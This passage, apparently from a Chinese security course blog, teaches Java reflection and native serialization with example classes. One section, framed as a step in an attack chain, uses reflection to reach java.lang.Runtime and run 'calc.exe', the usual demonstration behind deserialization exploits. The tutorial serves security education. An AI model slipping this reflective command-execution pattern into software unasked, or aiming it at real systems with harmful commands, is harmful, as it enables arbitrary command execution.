<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.listendemo1.listener;<br><br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebListener;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSessionEvent;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpSessionListener;<br><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenSession</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpSessionListener</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sessionCreated</span><span class="hljs-params">(HttpSessionEvent se)</span> &#123;<br>        <span class="hljs-comment">//监听检测有Session创建就会执行这里</span><br>        System.out.println(<span class="hljs-string">&quot;监听器监听到了session创建&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sessionDestroyed</span><span class="hljs-params">(HttpSessionEvent se)</span> &#123;<br>        <span class="hljs-comment">//监听检测有Session销毁就会执行这里</span><br>        System.out.println(<span class="hljs-string">&quot;监听器监听到了session销毁&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-反射机制-攻击链-类对象-成员变量方法-构造方法"><a href="#JavaEE应用-反射机制-攻击链-类对象-成员变量方法-构造方法" class="headerlink" title="JavaEE应用&amp;反射机制&amp;攻击链&amp;类对象&amp;成员变量方法&amp;构造方法"></a>JavaEE应用&amp;反射机制&amp;攻击链&amp;类对象&amp;成员变量方法&amp;构造方法</h3><ol>
<li><p>反射机制</p>
<p> 首先创建一个User类，包含成员变量和成员方法，构造方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-comment">//成员变量</span><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">private</span> String gender=<span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">protected</span> String job=<span class="hljs-string">&quot;sec&quot;</span>;<br><br><br>    <span class="hljs-comment">//构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//System.out.println(&quot;无参数&quot;);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;我的名字&quot;</span>+name);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(name);<br>        System.out.println(age);<br>    &#125;<br><br><br>    <span class="hljs-comment">//成员方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">userinfo</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age,String gender,String job)</span>&#123;<br>        <span class="hljs-built_in">this</span>.job=job;<br>        <span class="hljs-built_in">this</span>.age=age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">users</span><span class="hljs-params">(String name,String gender)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        System.out.println(<span class="hljs-string">&quot;users成员方法：&quot;</span>+name);<br>        System.out.println(<span class="hljs-string">&quot;users成员方法：&quot;</span>+gender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<ul>
<li><p>反射-Class对象类获取</p>
<p>1、根据全限定类名：<code>Class.forName(“全路径类名”)</code>​</p>
<p>2、根据类名：<code>类名.class</code>​</p>
<p>3、根据对象：<code>对象.getClass()</code>​</p>
<p>4、通过类加载器获得Class对象：<code>ClassLoader.getSystemClassLoader().loadClass(“全路径类名”);</code>​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetClass</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//1、根据全限定类名：Class.forName(&quot;全路径类名&quot;)</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>        System.out.println(aClass);<br>    <br>        <span class="hljs-comment">//2、根据类名：类名.class</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">userClass</span> <span class="hljs-operator">=</span> User.class;<br>        System.out.println(userClass);<br>    <br>        <span class="hljs-comment">//3、根据对象：对象.getClass()</span><br>        User user= <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> user.getClass();<br>        System.out.println(aClass1);<br>    <br>        <span class="hljs-comment">//4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);</span><br>        ClassLoader clsload=ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> clsload.loadClass(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>        System.out.println(aClass2);<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20240714203422-uhom2x4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>反射-Field成员变量类获取</p>
<p>​<img src="/assets/image-20240714203501-0xqmv1o.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ol>
<li><p>获取公共的成员变量</p>
<p> ​<img src="/assets/image-20240714203624-o03drfb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>获取所有的成员变量</p>
<p> ​<img src="/assets/image-20240714203753-6gizog5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 剩下的同理,不再赘述</p>
</li>
<li><p>源码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetFiled</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>    <br><span class="hljs-comment">//        //获取公共的成员变量</span><br><span class="hljs-comment">//        Field[] fields = aClass.getFields();</span><br><span class="hljs-comment">//        for (Field fd : fields) &#123;</span><br><span class="hljs-comment">//            System.out.println(fd);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br><span class="hljs-comment">//        //获取所有的成员变量</span><br><span class="hljs-comment">//        Field[] fields = aClass.getDeclaredFields();</span><br><span class="hljs-comment">//        for(Field fd:fields)&#123;</span><br><span class="hljs-comment">//            System.out.println(fd);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br><span class="hljs-comment">//        //获取单个的公共成员变量</span><br><span class="hljs-comment">//        Field name = aClass.getField(&quot;name&quot;);</span><br><span class="hljs-comment">//        System.out.println(name);</span><br>    <br><span class="hljs-comment">//        //获取单个的成员变量</span><br><span class="hljs-comment">//        Field gender = aClass.getDeclaredField(&quot;gender&quot;);</span><br><span class="hljs-comment">//        System.out.println(gender);</span><br>    <br><span class="hljs-comment">//        //获取公共的成员变量age的值</span><br><span class="hljs-comment">//        User u = new User();</span><br><span class="hljs-comment">//        Field field=aClass.getField(&quot;age&quot;);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //取值</span><br><span class="hljs-comment">//        Object a=field.get(u);</span><br><span class="hljs-comment">//        System.out.println(a);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //赋值</span><br><span class="hljs-comment">//        field.set(u,32);</span><br><span class="hljs-comment">//        Object aa=field.get(u);</span><br><span class="hljs-comment">//        System.out.println(aa);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>反射-Constructor构造方法类获取</p>
<p>​<img src="/assets/image-20240714204114-i24yak5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>原理同上,不多赘述,,源码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetConstructor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br>        <span class="hljs-comment">//获取公共的构造方法</span><br><span class="hljs-comment">//        Constructor[] constructors = aClass.getConstructors();</span><br><span class="hljs-comment">//        for (Constructor con:constructors)&#123;</span><br><span class="hljs-comment">//            System.out.println(con);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br>        <span class="hljs-comment">//获取所有的构造方法</span><br><span class="hljs-comment">//        Constructor[] constructors = aClass.getDeclaredConstructors();</span><br><span class="hljs-comment">//        for (Constructor con:constructors)&#123;</span><br><span class="hljs-comment">//            System.out.println(con);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br>        <span class="hljs-comment">//获取单个的公共的构造方法</span><br><span class="hljs-comment">//        Constructor constructor = aClass.getConstructor(String.class);</span><br><span class="hljs-comment">//        System.out.println(constructor);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //获取单个的构造方法</span><br><span class="hljs-comment">//        Constructor con1 = aClass.getDeclaredConstructor(String.class,int.class);</span><br><span class="hljs-comment">//        System.out.println(con1);</span><br><br><br>        <span class="hljs-comment">//对构造方法进行操作(两个参数string，int)</span><br><span class="hljs-comment">//        Constructor con2=aClass.getDeclaredConstructor(String.class,int.class);</span><br><span class="hljs-comment">//        //临时开启对私有的访问</span><br><span class="hljs-comment">//        con2.setAccessible(true);</span><br><span class="hljs-comment">//        User uu=(User) con2.newInstance(&quot;xiaodigaygay&quot;,40);</span><br>        <span class="hljs-comment">//System.out.println(uu);</span><br>    <br>        <span class="hljs-comment">//对构造方法进行执行(1个参数strin)</span><br><span class="hljs-comment">//        Constructor con2=aClass.getConstructor(String.class);</span><br><span class="hljs-comment">//        con2.newInstance(&quot;xiaodigaygay&quot;);</span><br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>反射-Method成员方法类获取</p>
<p>​<img src="/assets/image-20240714205642-k9hjnp4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>同……源码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.reflectdemo1;<br>    <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.example.reflectdemo1.User&quot;</span>);<br><span class="hljs-comment">//        //获取包括继承的公共成员方法</span><br><span class="hljs-comment">//        Method[] methods = aClass.getMethods();</span><br><span class="hljs-comment">//        for(Method me:methods)&#123;</span><br><span class="hljs-comment">//            System.out.println(me);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br><span class="hljs-comment">//        //获取不包括继承的所有成员方法</span><br><span class="hljs-comment">//        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="hljs-comment">//        for(Method me:methods)&#123;</span><br><span class="hljs-comment">//            System.out.println(me);</span><br><span class="hljs-comment">//        &#125;</span><br>    <br><span class="hljs-comment">//        //获取单个的成员方法</span><br><span class="hljs-comment">//        Method users = aClass.getDeclaredMethod(&quot;users&quot;, String.class,String.class);</span><br><span class="hljs-comment">//        System.out.println(users);</span><br><br><br><span class="hljs-comment">//        //对成员方法进行执行</span><br><span class="hljs-comment">//        User u = new User();</span><br><span class="hljs-comment">//        Method users = aClass.getDeclaredMethod(&quot;users&quot;, String.class,String.class);</span><br><span class="hljs-comment">//        users.invoke(u,&quot;xiaodigay&quot;,&quot;gay1&quot;);</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>反射-命令执行</p>
<p>原理：Java自带包含有的java.lang中有对于本机控制台的调用方法</p>
<p>​<img src="/assets/image-20240714213343-kmjdibx.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p>第三方的包—反射实现命令执行</p>
<ol>
<li><p>首先使用 Class.forName获取 java.lang.Runtime 类</p>
</li>
<li><p>通过getMethods获取该类<strong>包括继承</strong>的<strong>公共成员</strong>方法，并遍历出来</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 使用 Class.forName 获取 java.lang.Runtime 类</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <br><span class="hljs-comment">// 获取 Runtime 类的所有公共方法</span><br>Method[] methods = aClass.getMethods();<br>    <br><span class="hljs-comment">// 遍历所有方法并打印输出方法信息</span><br><span class="hljs-keyword">for</span> (Method me : methods) &#123;<br>    System.out.println(me);<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>通过查询找到对应需要的成员方法</p>
<p> ​<img src="/assets/image-20240714214148-v4mgn7l.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>根据成员方法的名称和参数，分别对应获取所需成员方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取名为 &quot;exec&quot; 的方法，该方法接受一个 String 参数</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> aClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    <br><span class="hljs-comment">// 获取名为 &quot;getRuntime&quot; 的方法，该方法不接受参数</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> aClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>    <br><span class="hljs-comment">// 使用反射调用 aClass 对象的 getRuntime 方法，获取 Runtime 对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(aClass);<br>    <br><span class="hljs-comment">// 使用反射调用 Runtime 对象的 exec 方法，执行系统命令 &quot;calc.exe&quot;</span><br>exec.invoke(runtime, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>通过使用获取的方法依次调用执行即可</p>
<p> ​<img src="/assets/image-20240714214425-hu5cs4k.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-原生反序列化-重写方法-链条分析-触发类-类加载"><a href="#JavaEE应用-原生反序列化-重写方法-链条分析-触发类-类加载" class="headerlink" title="JavaEE应用&amp;原生反序列化&amp;重写方法&amp;链条分析&amp;触发类&amp;类加载"></a>JavaEE应用&amp;原生反序列化&amp;重写方法&amp;链条分析&amp;触发类&amp;类加载</h3><ol>
<li><p>原生反序列化</p>
<ul>
<li><p>序列化实现，创建用户类，实现Serializable接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">// 用户信息类，实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">// 公共成员变量</span><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gender=<span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">public</span> Integer age=<span class="hljs-number">30</span>;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name,String gender,Integer age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">// toString 方法，用于打印对象信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>创建对应的序列化类，并创建对应的序列化方法：SerializableDemo.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">//序列化演示类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//创建一个对象 引用UserDemo</span><br>        UserDemo u=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDemo</span>(<span class="hljs-string">&quot;xdsec&quot;</span>,<span class="hljs-string">&quot;gay1&quot;</span>,<span class="hljs-number">30</span>);<br>        <span class="hljs-comment">//调用方法进行序列化</span><br>        SerializableTest(u);<br>        <span class="hljs-comment">//ser.txt 就是对象u 序列化的字节流数据</span><br>    &#125;<br><br><br>    <span class="hljs-comment">// 序列化方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SerializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 使用 ObjectOutputStream 将对象 obj 序列化后输出到文件 ser.txt</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        <span class="hljs-comment">// 将对象 obj 进行序列化，并将序列化后的数据写入到文件输出流中。</span><br>        oos.writeObject(obj);<br>        <span class="hljs-comment">// 关闭流</span><br>        oos.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>ser.txt的内容：</p>
<p>​<img src="/assets/image-20240715002752-9zrdz8j.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>创建对应反序列化类，并创建对应反序列化方法：UnserializableDemo.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br>    <br><span class="hljs-keyword">import</span> java.io.*;<br>    <br><span class="hljs-comment">//反序列化演示类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializableDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span 